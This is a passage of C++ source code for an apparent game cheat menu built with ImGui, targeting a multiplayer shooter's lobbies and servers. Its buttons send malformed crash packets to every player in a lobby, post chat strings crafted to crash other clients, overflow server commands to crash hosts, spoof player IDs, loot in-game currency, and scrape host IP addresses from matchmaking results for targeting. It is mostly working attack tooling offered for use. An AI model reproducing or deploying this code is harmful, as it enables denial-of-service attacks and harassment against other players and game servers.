						auto messag2 = "^4User ID ^BBUTTON_CYCLE_RIGHT^ ^1"s + std::to_string(player_xuid);
						send_chat_message(messag2.data());
					}



					ImGui::EndPopup();
				}

				ImGui::NextColumn();

				if (ImGui::GetColumnIndex() == 0)
				{
					ImGui::Separator();
				}
			}
		}
		ImGui::EndColumns();

		ImGui::Dummy(ImVec2(0.0f, 300.0f));

		ImGui::Separator();

		ImGui::Dummy(ImVec2(0.0f, 5.0f));

		if (ImGui::Button("Kick all", ImVec2(150, 30)))
		{

			for (size_t i = 0; i < 18; ++i)
			{
				const auto target_client{ LobbySession_GetClientByClientNum(session, i) };

				if (target_client && target_client->activeClient)
				{
					const auto player_xuid{ target_client->activeClient->fixedClientInfo.xuid };
					const auto player_name{ target_client->activeClient->fixedClientInfo.gamertag };

					const auto sess_info{ players_session_info[player_xuid] };
					const auto netadr{ LobbySession_GetClientNetAdrByIndex(get_lobby_type(), i) };

					send_connect_response_migration_packet(netadr);
					SendKICK(player_xuid, netadr);
				}
			}
		}

		ImGui::SameLine();



		if (ImGui::Button("Crash all", ImVec2(150, 30)))
		{

			for (size_t i = 0; i < 18; ++i)
			{
				const auto target_client{ LobbySession_GetClientByClientNum(session, i) };

				if (target_client && target_client->activeClient)
				{
					const auto player_xuid{ target_client->activeClient->fixedClientInfo.xuid };
					const auto player_name{ target_client->activeClient->fixedClientInfo.gamertag };

					const auto sess_info{ players_session_info[player_xuid] };
					const auto netadr{ LobbySession_GetClientNetAdrByIndex(get_lobby_type(), i) };

					send_crash(player_xuid);
					send_relay_crash_packet(netadr);
					send_voicetest_crash_packet(netadr);
					send_lm_crash2(player_xuid, netadr);
					send_lm_crash(player_xuid, netadr);
					send_lm_crash3(player_xuid, netadr);
					send_hostheartbeat_crash(netadr, player_xuid);
					send_lsprivate_crash(netadr, player_xuid);
					send_lsgame_crash(netadr, player_xuid);
					SendVoicePacket(player_xuid, netadr);
				}
			}
		}

		ImGui::SameLine();

		if (ImGui::Button("Migrate all", ImVec2(150, 30)))
		{

			for (size_t i = 0; i < 18; ++i)
			{
				const auto target_client{ LobbySession_GetClientByClientNum(session, i) };

				if (target_client && target_client->activeClient)
				{
					const auto player_xuid{ target_client->activeClient->fixedClientInfo.xuid };
					const auto player_name{ target_client->activeClient->fixedClientInfo.gamertag };

					const auto sess_info{ players_session_info[player_xuid] };
					const auto netadr{ LobbySession_GetClientNetAdrByIndex(get_lobby_type(), i) };

					send_mstart_packet(netadr);
				}
			}
		}

		ImGui::SameLine();

		if (ImGui::Button("Imobilize all", ImVec2(150, 30)))
		{

			for (size_t i = 0; i < 18; ++i)
			{
				const auto target_client{ LobbySession_GetClientByClientNum(session, i) };

				if (target_client && target_client->activeClient)
				{
					const auto player_xuid{ target_client->activeClient->fixedClientInfo.xuid };
					const auto player_name{ target_client->activeClient->fixedClientInfo.gamertag };

					const auto sess_info{ players_session_info[player_xuid] };
					const auto netadr{ LobbySession_GetClientNetAdrByIndex(get_lobby_type(), i) };

					send_request_stats_packet(netadr);
				}
			}
		}

		ImGui::Dummy(ImVec2(0.0f, 20.0f));
		ImGui::EndTabItem();
	}
}

void misc()
{
	if (ImGui::BeginTabItem("Misc"))
	{



		ImGui::Dummy(ImVec2(0.0f, 4.0f));

		ImGui::Checkbox("  <--  Friend Only", &friendonly);//will block all info request from any clients that arent in your steam friend list.

		ImGui::SameLine();

		ImGui::Dummy(ImVec2(10.0f, 0.0f));

		ImGui::SameLine();

		ImGui::Checkbox("  <--  chat crash attempts ", &chatcrash);//sending a message in the game chat when someone try to exploit you.

		ImGui::Dummy(ImVec2(0.0f, 2.0f));

		ImGui::Separator();

		ImGui::Dummy(ImVec2(0.0f, 2.0f));

		ImGui::Checkbox("White Calling Card", &whitecard);

		ImGui::SameLine();

		ImGui::Dummy(ImVec2(10.0f, 0.0f));

		ImGui::SameLine();

		ImGui::Checkbox("Empty Calling Card", &invisiblecard);

		ImGui::Dummy(ImVec2(0.0f, 2.0f));

		ImGui::Separator();

		ImGui::Dummy(ImVec2(0.0f, 2.0f));

		ImGui::Checkbox("  <--  Loot Crypto", &ct);

		ImGui::SameLine();

		ImGui::Dummy(ImVec2(52.0f, 0.0f));

		ImGui::SameLine();

		ImGui::Checkbox("  <--  Loot diviniums", &div_loop);

		ImGui::Dummy(ImVec2(0.0f, 2.0f));

		ImGui::Checkbox("  <--  Spend Crypto", &bCryptoSpend);

		ImGui::SameLine();

		ImGui::Dummy(ImVec2(52.0f, 0.0f));

		ImGui::SameLine();

		ImGui::Checkbox("  <--  Spend diviniums", &bDiviniumSpend);

		ImGui::Dummy(ImVec2(0.0f, 2.0f));


		ImGui::Dummy(ImVec2(0.0f, 2.0f));

		if (ImGui::Button("disconnect"))
		{
			Cbuf_AddText(0, "disconnect");
		}

		ImGui::SameLine();

		if (ImGui::Button("quit game"))
		{
			Cbuf_AddText(0, "quit");
		}

		ImGui::Dummy(ImVec2(0.0f, 2.0f));

		ImGui::Separator();

		ImGui::Dummy(ImVec2(0.0f, 2.0f));

		if (ImGui::Button("Crash everyone"))//sending an invalid material causing a crash for anyone not filtering the chat.
		{
			send_chat_message("^B#####!#####");
		}

		ImGui::SameLine();

		if (ImGui::Button("Crash everyone (your mum 2)"))// sending an overflowed invalid model.
		{
			send_chat_message("$(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa)");
		}


		ImGui::Dummy(ImVec2(0.0f, 2.0f));

		ImGui::Separator();

		ImGui::Dummy(ImVec2(0.0f, 2.0f));

		if (ImGui::Button("Crash Server")) //sending a bunch of shit to crash the server.
		{
			__int64 _server_id = qwProcessBase + 0x569B250;

			char s1[2048];
			sprintf_s(s1, "mrp %d 2000000000 %d", (int)_server_id, 0);

			char s2[2048];
			sprintf_s(s2, "mrp %d 0 %d", (int)_server_id, 0x7FFFFFFF);

			CL_AddReliableCommand(0, s1);
			CL_AddReliableCommand(0, s2);
			LobbyClientMsg_SendModifiedStats(0, 1);
		}

		ImGui::SameLine();

		if (ImGui::Button("End Game"))//ending the game
		{
			char buf[255];
			__int64 _server_id = qwProcessBase + 0x569B250;
			sprintf_s(buf, "mr %d -1 endround", *(DWORD*)_server_id);
			CL_AddReliableCommand(0, buf);
		}

		ImGui::SameLine();

		if (ImGui::Button("Crash Server 2.0"))// sending sound lenght command to the server that cause a crash.
		{
			CL_AddReliableCommand(0, "sl 1488 88");
		}

		ImGui::SameLine();

		if (ImGui::Button("Loadside"))// sending a command to change the map that crash everyone if the sender is not host
		{
			Cbuf_AddText(0, "cmd loadside 0 mp_metro dm 1;");
			Cbuf_AddText(0, "cmd loadside 0 mp_sector dm 1;");
		}

		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		//_______________________________SpoofXUID_____________________________\\


		static auto spoofedXUID_input = ""s;

		ImGui::InputTextWithHint("##SpoofedXUID", "XUID TO SET", &spoofedXUID_input);

		ImGui::SameLine();

		if (ImGui::Button("Spoof"))
		{
			spoofedXUID = _atoi64(spoofedXUID_input.c_str());
			SetXUIDSpoofed(true);
		}

		ImGui::Separator();

		//_______________________________Chat_____________________________\\

		static auto chat_message = ""s;


		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		ImGui::InputTextWithHint("##CHAT", "Chat", &chat_message);

		ImGui::SameLine();

		if (ImGui::Button("chat"))
		{
			send_chat_message(chat_message.data());
		}

		ImGui::Separator();

		//_______________________________Name changer_____________________________\\

		static auto nameBuffer = ""s;

		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		ImGui::InputTextWithHint("##NAME", "Name", &nameBuffer);
		ImGui::SameLine();

		if (ImGui::Button("Set##NAME"))
		{
			strncpy_s(spoofName, sizeof(spoofName), nameBuffer.data(), -1);
			RenamePreGame(spoofName);
		}

		//_______________________________Clantag changer_____________________________\\

		static auto clan_input = ""s;

		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		ImGui::InputTextWithHint("##CLAN", "Clan", &clan_input);
		ImGui::SameLine();

		if (ImGui::Button("Set##CLAN"))
		{
			LiveStats_SetClanTagText(0, clan_input.data());
		}

		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		ImGui::Separator();

		static auto join_input = ""s;

		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		ImGui::InputTextWithHint("##JOIN", "Join By Steam ID", &join_input);
		ImGui::SameLine();

		if (ImGui::Button("Join##STEAMID"))
		{
			LobbyVM_JoinEvent(0, _atoi64(join_input.c_str()), JoinType::JOIN_TYPE_PARTY);
		}

		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		static auto profil_input = ""s;

		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		ImGui::InputTextWithHint("##PROFIL", "Profil By Steam ID", &profil_input);
		ImGui::SameLine();

		if (ImGui::Button("Profil##STEAMID"))
		{
			LiveUser_GetProfilByXUID(_atoi64(profil_input.c_str()));
		}

		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		static auto request_input = ""s;

		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		ImGui::InputTextWithHint("##Request", "Friend Request By Steam ID", &request_input);
		ImGui::SameLine();

		if (ImGui::Button("Send##STEAMID"))
		{
			LiveUser_FriendRequestByXUID(_atoi64(request_input.c_str()));
		}

		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		ImGui::Separator();

		static auto cbuf_input = ""s;

		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		ImGui::InputTextWithHint("##CBUF", "CBUF", &cbuf_input);
		ImGui::SameLine();

		if (ImGui::Button("Send##CBUF"))
		{
			Cbuf_AddText(0, cbuf_input.data());
		}

		static auto single_input = ""s;

		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		ImGui::InputTextWithHint("##SINGLE", "SINGLE", &single_input);
		ImGui::SameLine();

		if (ImGui::Button("Send##SINGLE"))
		{
			Cmd_ExecuteSingleCommand(0, 0, single_input.data(), false);
		}

		static auto reliable_input = ""s;

		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		ImGui::InputTextWithHint("##RELIABLE", "RELIABLE", &reliable_input);

		ImGui::SameLine();

		if (ImGui::Button("Send##RELIABLE"))
		{
			CL_AddReliableCommand(0, reliable_input.data());
		}

		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		ImGui::Separator();

		static auto crash_input = ""s;

		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		ImGui::InputTextWithHint("##CRASH", "CRASH", &crash_input);
		ImGui::SameLine();

		if (ImGui::Button("Send##CRASH"))
		{
			send_crash(std::stoull(crash_input));

		}

		static auto popup_input = ""s;

		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		ImGui::InputTextWithHint("##POP-UP", "POP-UP", &popup_input);
		ImGui::SameLine();

		if (ImGui::Button("Send##POP-UP"))
		{
			send_popup(std::stoull(popup_input));
		}

		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		ImGui::Separator();

		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		if (ImGui::CollapsingHeader("Crosshairs"))
		{
			ImGui::Checkbox(".", &pointcrosshair);
			ImGui::Checkbox("o", &circlecrosshair);
			ImGui::Checkbox("+", &crosscrosshair);
			ImGui::Checkbox("nazi", &nazicrosshair);

			ImGui::Dummy(ImVec2(0.0f, 3.0f));

			ImGui::Separator();

		}

		ImGui::EndTabItem();
	}
}





std::map< int, std::string> log_s = {};

static char logInput[255] = "";

void AddToLog(std::string output)
{
	log_s[(int)log_s.size() + 1] = output.c_str();

}


void Developer()
{
	if (ImGui::BeginTabItem("Logs"))
	{


		ImGui::BeginChild("ContentRegion", ImVec2(0.0f, 302.0f), true);
		{
			ImGui::Indent(3);
			for (const auto& text : log_s)
			{
				ImGui::TextDisabled(text.second.c_str());
				if (ImGui::GetScrollY() >= ImGui::GetScrollMaxY())
				{
					ImGui::SetScrollHereY(1.0f);
				}
			}
			ImGui::EndChild();
		}

		ImGui::Spacing();

		if (ImGui::Button(("Add To Log:")))
			log_s[(int)log_s.size() + 1] = logInput;
		ImGui::SameLine();
		ImGui::PushItemWidth(ImGui::GetContentRegionAvail().x);
		ImGui::InputText(("##logInput"), logInput, IM_ARRAYSIZE(logInput));

		ImGui::Spacing();

		if (ImGui::Button(("Clear"), ImVec2(182.0f, 22.0f)))
			log_s = {};
		ImGui::SameLine(0.0f, ImGui::GetStyle().ItemInnerSpacing.x);
		if (ImGui::Button(("Seperator"), ImVec2(182.0f, 22.0f)))
			log_s[(int)log_s.size() + 1] = ("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
		ImGui::SameLine(0.0f, ImGui::GetStyle().ItemInnerSpacing.x);
		if (ImGui::Button(("copy"), ImVec2(182.0f, 22.0f)))
		{
			std::string exported = ("");
			for (const auto& text : log_s)
				exported += text.second.c_str() + std::string(("\n"));

			log_s[(int)log_s.size() + 1] = ("Log copied to clipboard\n");
			ImGui::SetClipboardText(exported.c_str());
			if (log_s[(int)log_s.size()] == "Godness_Glitch")
			{
				((__int64(__cdecl*)(unsigned int ControllerIndex, unsigned int eModes, unsigned int statsLocation, unsigned int CharacterIndex))(qwProcessBase + 0xAD860))(0, 1, 0, 10);
			}

		}

		ImGui::EndTabItem();
	}
}

std::vector<server_t> servers;

void get_servers() {

	const auto session{ LobbySession_GetSession(get_lobby_type()) };

	LobbySearch_SearchSession(session);

	for (size_t i = 0; i < 50; ++i)
	{

		/*	auto s_lobbySearch = *(LobbySearch*)(qwProcessBase + 0x15B9E608);*/
		auto g_sessionResults = *(MatchMakingInfo*)(qwProcessBase + 0x99AC5F0 + (i * 448));

		auto hostAddress = *(XNADDR*)((qwProcessBase + 0x99AA5F0 + (i * 448)) - 312);
		auto gameSecurityId = *(bdSecurityID*)((qwProcessBase + 0x99AA5F0 + (i * 448)) - 40);
		auto gameSecurityKey = *(bdSecurityKey*)((qwProcessBase + 0x99AA5F0 + (i * 448)) - 32);

		auto serverType = *(unsigned int*)((qwProcessBase + 0x99AA5F0 + (i * 448)) - 12);
		auto gameType = *(unsigned int*)((qwProcessBase + 0x99AA5F0 + (i * 448)) - 52);

		auto geo1 = *(int*)((qwProcessBase + 0x99AA5F0 + (i * 448)) - 40);
		auto geo2 = *(int*)((qwProcessBase + 0x99AA5F0 + (i * 448)) - 44);
		auto geo3 = *(int*)((qwProcessBase + 0x99AA5F0 + (i * 448)) - 48);
		auto geo4 = *(int*)((qwProcessBase + 0x99AA5F0 + (i * 448)) - 52);

		auto hostxuid = *(uint64_t*)((qwProcessBase + 0x99AA5F0 + (i * 448)) - 8);

		auto numPlayers = *(unsigned int*)((qwProcessBase + 0x99AA5F0 + (i * 448)) - 44);
		auto maxPlayers = *(unsigned int*)((qwProcessBase + 0x99AA5F0 + (i * 448)) - 48);

		char ipbuf[2048];
		sprintf_s(ipbuf, "%u.%u.%u.%u", hostAddress.ip[0], hostAddress.ip[1], hostAddress.ip[2], hostAddress.ip[3]);

		char portbuf[2048];
		sprintf_s(portbuf, "%u", hostAddress.port);




		auto ip_string = ipbuf;

		auto port_string = portbuf;



		for (auto& server : servers) {

			if (server.xuid == hostxuid) continue;
		}

		if (hide_p2p_sessions && serverType == 1001 || serverType == 1004 || serverType == 1002) continue;

		if (hide_empty_sessions && numPlayers == 0) continue;

		servers.emplace_back(server_t{ hostxuid, ip_string, port_string, numPlayers, maxPlayers, serverType, gameType, geo1, geo2, geo3, geo4 });
	}
}

void drawserverlist() {

	if (ImGui::BeginTabItem("Servers"))
	{







		int amount = servers.size();

		const auto width = ImGui::GetContentRegionAvail().x;

		const auto spacing = ImGui::GetStyle().ItemInnerSpacing.x;

		static ImGuiTextFilter filter;

		if (ImGui::Button("Fetch Session"))
		{
			get_servers();
		}

		ImGui::SameLine();

		if (ImGui::Button("Clear Sessions"))
		{
			servers.clear();
		}

		ImGui::SameLine();

		ImGui::Checkbox("Hide P2P Sessions", &hide_p2p_sessions);

		ImGui::SameLine();

		ImGui::Checkbox("Hide Empty Sessions", &hide_empty_sessions);

		ImGui::Dummy(ImVec2(0.0f, 1.49f));

		ImGui::Separator();

		ImGui::Dummy(ImVec2(0.0f, 1.49f));

		ImGui::TextUnformatted("Search Servers");

		ImGui::SameLine();

		ImGui::Dummy(ImVec2(210.f, 0));

		ImGui::SameLine();

		ImGui::Text("Total Servers : %i", amount);

		filter.Draw("##search_servers", "Servers", width * 0.80f);

		ImGui::Separator();

		ImGui::Dummy(ImVec2(0, 5));

		ImGui::BeginColumns("Servers", 3, ImGuiColumnsFlags_NoResize);

		ImGui::SetColumnWidth(-1, 35.0f);
		ImGui::TextUnformatted("#");
		ImGui::NextColumn();
		ImGui::SetColumnWidth(-1, 500.0f);
		ImGui::TextUnformatted("Server");
		ImGui::NextColumn();
		ImGui::TextUnformatted("Clients");

		ImGui::NextColumn();

		ImGui::Separator();

		std::vector<size_t> indices{};

		for (size_t i = 1; i < servers.size(); ++i)
		{
			indices.emplace_back(i);
		}

		for (const auto& server_num : indices)
		{

			if (auto& server = servers[server_num]; filter.PassFilter(server.ip))
			{

				bool s_server = false;

				bool s_clients = false;

				const auto server_ip_string{ server.ip };
				const auto server_port_string{ server.port };
				const auto server_region{ server.geo1 };
				const auto server_region2{ server.geo2 };
				const auto server_region3{ server.geo3 };
				const auto server_region4{ server.geo4 };

				const auto server_popup{ "server_popup##" + std::to_string(server_num) };

				const auto clients_popup{ "clients_popup##" + std::to_string(server_num) };

				ImGui::AlignTextToFramePadding();
				ImGui::TextUnformatted(std::to_string(server_num).data());

				ImGui::NextColumn();

				ImGui::AlignTextToFramePadding();

				s_server = ImGui::Selectable((server_ip_string + ":" + server_port_string + "##"s + std::to_string(server_num)).data());

				ImGui::SameLine();

				ImGui::PushStyleColor(ImGuiCol_Text, ImColor(150, 150, 150, 255).Value);

				ImGui::PopStyleColor();

				ImGui::NextColumn();

				ImGui::AlignTextToFramePadding();

				ImGui::PushStyleColor(ImGuiCol_Text, ImColor(50, 70, 112, 250).Value);

				ImGui::Text("%u/%u", server.numPlayers, server.maxPlayers);

				ImGui::PopStyleColor();

				const auto server_selected{ server };

				if (s_server)
				{
					ImGui::OpenPopup(server_popup.data());
				}

				if (ImGui::BeginPopup(server_popup.data(), ImGuiWindowFlags_NoMove))
				{

					std::string servertype = std::to_string(server.serverType);

					if (server.serverType == 1001 || server.serverType == 1004)
						servertype = "Peer to Peer";

					if (server.serverType == 2000)
						servertype = "Dedicated Server";

					ImGui::MenuItem(servertype, nullptr, false, false);

					ImGui::MenuItem(std::to_string(server.xuid));

					if (ImGui::IsItemClicked())
					{
						ImGui::LogToClipboardUnformatted(std::to_string(server.xuid));
					}

					ImGui::SameLine();

					ImGui::PushStyleColor(ImGuiCol_Text, ImColor(150, 150, 150, 255).Value);

					ImGui::Text("Click to Copy");

					if (ImGui::IsItemClicked())
					{
						ImGui::LogToClipboardUnformatted(std::to_string(server.xuid));
					}

					ImGui::PopStyleColor();

					if (ImGui::MenuItem("Join Server"))
					{
						LobbyVM_JoinEvent(0, server.xuid, JoinType::JOIN_TYPE_PARTY);
					}

					if (ImGui::MenuItem("Crash Server"))
					{
						send_crash(server.xuid);
					}

					ImGui::Separator();

					ImGui::EndPopup();
				}

				ImGui::NextColumn();

				if (ImGui::GetColumnIndex() == 0)
				{
					ImGui::Separator();
				}

			}

		}

		ImGui::EndColumns();
		ImGui::EndTabItem();


	}


}

//void tools()
//{
//	if (ImGui::BeginTabItem("Tools"))
//	{
//		if (ImGui::TreeNode("Class Editor"))
//		{
//
//			ImGui::Dummy(ImVec2(0.0f, 2.0f));
//
//			static int ItemId = 0;
//			static int ClassIndex = 0;
//
//			if (ImGui::Button("Set Class"))
//			{
//
//				char Buffer[8];
//
//				__int64 a = Class1();
//				__int64 a1 = Class2();
//				__int64 a3 = Class3(a1, a);
//				Class4(Buffer, 0, a3);
//				__int64 a4 = Class5(slots[slotItem]);
//				SetClass(Buffer, (unsigned int)ClassIndex, a4, ItemId);
//			}
//
//
//			/*
//			ImGui::SameLine();
//
//			if (ImGui::Button("Super Speed"))
//			{
//
//				char Buffer[8];
//
//				__int64 a = Class1();
//				__int64 a1 = Class2();
//				__int64 a3 = Class3(a1, a);
//				Class4(Buffer, 0, a3);
//				__int64 a4 = Class5("talent1");
//				__int64 a5 = Class5("talent2");
//				__int64 a6 = Class5("talent3");
//				__int64 a7 = Class5("talent4");
//				__int64 a8 = Class5("talent5");
//				__int64 a9 = Class5("talent6");
//				SetClass(Buffer, (unsigned int)ClassIndex, a4, 11);
//				SetClass(Buffer, (unsigned int)ClassIndex, a5, 38);
//				SetClass(Buffer, (unsigned int)ClassIndex, a6, 38);
//				SetClass(Buffer, (unsigned int)ClassIndex, a7, 38);
//				SetClass(Buffer, (unsigned int)ClassIndex, a8, 38);
//				SetClass(Buffer, (unsigned int)ClassIndex, a9, 38);
//			}*/
//
//			ImGui::SameLine();
//
//			if (ImGui::Button("Clear Class"))
//			{
//
//				char Buffer[8];
//
//				__int64 a = Class1();
//				__int64 a1 = Class2();
//				__int64 a3 = Class3(a1, a);
//				Class4(Buffer, 0, a3);
//				__int64 a4 = Class5("primary");
//				__int64 a5 = Class5("primaryattachment1");
//				__int64 a6 = Class5("primaryattachment2");
//				__int64 a7 = Class5("primaryattachment3");
//				__int64 a8 = Class5("primaryattachment4");
//				__int64 a9 = Class5("primaryattachment5");
//				__int64 a10 = Class5("primaryattachment6");
//				__int64 a11 = Class5("primaryattachment7");
//				__int64 a12 = Class5("secondary");
//				__int64 a13 = Class5("secondaryattachment1");
//				__int64 a14 = Class5("secondaryattachment2");
//				__int64 a15 = Class5("secondaryattachment3");
//				__int64 a16 = Class5("secondaryattachment4");
//				__int64 a17 = Class5("secondaryattachment5");
//				__int64 a18 = Class5("secondaryattachment6");
//				__int64 a19 = Class5("secondaryattachment7");
//				__int64 a20 = Class5("talent1");
//				__int64 a21 = Class5("talent2");
//				__int64 a22 = Class5("talent3");
//				__int64 a23 = Class5("talent4");
//				__int64 a24 = Class5("talent5");
//				__int64 a25 = Class5("talent6");
//				__int64 a26 = Class5("bonuscard1");
//				__int64 a27 = Class5("bonuscard2");
//				__int64 a28 = Class5("bonuscard3");
//				__int64 a29 = Class5("primarycamo");
//				__int64 a30 = Class5("secondarycamo");
//				__int64 a31 = Class5("primaryreticle");
//				__int64 a32 = Class5("primarypaintjobslot");
//				__int64 a33 = Class5("primaryweaponmodelslot");
//				__int64 a34 = Class5("primarycharm");
//				__int64 a35 = Class5("primarydeathfx");
//				__int64 a36 = Class5("secondaryreticle");
//				__int64 a37 = Class5("secondarypaintjobslot");
//				__int64 a38 = Class5("secondaryweaponmodelslot");
//				__int64 a39 = Class5("secondarycharm");
//				__int64 a40 = Class5("secondarydeathfx");
//				__int64 a41 = Class5("primarygrenade");
//				__int64 a42 = Class5("primarygrenadecount");
//				__int64 a43 = Class5("specialgrenade");
//				__int64 a44 = Class5("specialgrenadecount");
//				__int64 a45 = Class5("herogadget");
//				__int64 a46 = Class5("specialty1");
//				__int64 a47 = Class5("specialty2");
//				__int64 a48 = Class5("specialty3");
//				__int64 a49 = Class5("specialty4");
//				__int64 a50 = Class5("specialty5");
//				__int64 a51 = Class5("specialty6");
//				__int64 a52 = Class5("talisman1");
//				__int64 a53 = Class5("tacticalgear");
//				__int64 a54 = Class5("equippedBubbleGumPack");
//				SetClass(Buffer, (unsigned int)ClassIndex, a4, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a5, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a6, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a7, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a8, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a9, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a10, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a11, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a12, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a13, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a14, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a15, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a16, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a17, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a18, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a19, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a20, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a21, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a22, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a23, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a24, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a25, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a26, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a27, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a28, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a29, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a30, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a31, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a32, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a33, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a34, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a35, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a36, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a37, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a38, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a39, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a40, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a41, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a42, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a43, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a44, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a45, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a46, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a47, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a48, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a49, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a50, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a51, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a52, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a53, 0);
//				SetClass(Buffer, (unsigned int)ClassIndex, a54, 0);
//
//			}
//
//			ImGui::Dummy(ImVec2(0.0f, 3.0f));
//
//			ImGui::InputInt("Item ID", &ItemId);
//
//			ImGui::Dummy(ImVec2(0.0f, 3.0f));
//
//			ImGui::Combo("Slot Name", &slotItem, slots, IM_ARRAYSIZE(slots));
//
//			ImGui::Dummy(ImVec2(0.0f, 3.0f));
//
//			ImGui::Combo("Class Index", &class_sel, customclass, IM_ARRAYSIZE(customclass));
//
//			ClassIndex = class_sel;
//
//			ImGui::Dummy(ImVec2(0.0f, 3.0f));
//
//			ImGui::TreePop();
//		}
//
//		//if (ImGui::Button("3P Party"))
//		//{
//		//	SV_GameSendServerCommand(-1, 1, "t 1 -465859 1");
//		//}
//
//
//
//		ImGui::EndTabItem();
//	}
//}

void hosttab()
{
	if (ImGui::BeginTabItem("Host"))
	{


		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		ImGui::Checkbox("  <--  force host", &forcehost);
		if (forcehost == 1)
		{
			Dvar_SetFromStringByName("party_minPlayers", "1", 1);
			Dvar_SetFromStringByName("lobbyDedicatedSearchSkip", "1", 1);
			Dvar_SetFromStringByName("lobbySearchTeamSize", "1", 1);
			Dvar_SetFromStringByName("lobbySearchSkip", "1", 1);
			Dvar_SetFromStringByName("lobbyMergeDedicatedEnabled", "0", 0);
			Dvar_SetFromStringByName("lobbyMergeEnabled", "0", 0);
		}
		if (forcehost == 0)
		{
			Dvar_SetFromStringByName("party_minPlayers", "0", 0);
			Dvar_SetFromStringByName("lobbyDedicatedSearchSkip", "0", 0);
			Dvar_SetFromStringByName("lobbySearchTeamSize", "0", 0);
			Dvar_SetFromStringByName("lobbySearchSkip", "0", 0);
			Dvar_SetFromStringByName("lobbyMergeDedicatedEnabled", "1", 1);
			Dvar_SetFromStringByName("lobbyMergeEnabled", "1", 1);
		}
		ImGui::SameLine();


		if (ImGui::Button("launch"))
		{
			Cbuf_AddText(0, "lobbylaunchgame");
		}

		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		if (ImGui::Button("Crash Server"))
		{
			Cbuf_AddText(0, "hostmigration_start");
		}

		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		ImGui::Separator();

		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		if (ImGui::Button("map_restart"))
		{
			Cbuf_AddText(0, "map_restart");
		}

		ImGui::SameLine();

		ImGui::Dummy(ImVec2(5.0f, 0.0f));

		ImGui::SameLine();

		if (ImGui::Button("fast restart"))
		{
			Cbuf_AddText(0, "fast_restart");
		}

		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		ImGui::Separator();

		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		if (ImGui::Button("God Mod"))
		{
			Cbuf_AddText(0, "god");
		}

		ImGui::SameLine();

		ImGui::Dummy(ImVec2(5.0f, 0.0f));

		ImGui::SameLine();

		if (ImGui::Button("No Clip"))
		{
			Cbuf_AddText(0, "noclip");
		}

		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		ImGui::Separator();

